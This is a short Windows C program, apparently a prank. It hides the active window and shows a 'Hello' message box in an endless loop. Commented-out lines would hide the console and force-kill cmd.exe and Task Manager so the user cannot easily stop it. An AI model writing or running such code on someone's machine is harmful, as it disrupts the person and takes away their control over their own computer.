#include<windows.h>
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // 设置入口地址
void windows()
{
	HWND a;
	a = GetForegroundWindow();
	ShowWindow(a,0);
	while(1){ 
	MessageBox(NULL,TEXT("Hello"),TEXT("Notice"),MB_OK);
	//system("taskkill -f -t -im cmd.exe");
	//system("taskkill -f -t -im taskmgr.exe");
	} 
}
int main()
{
	windows();
	return 0;
}
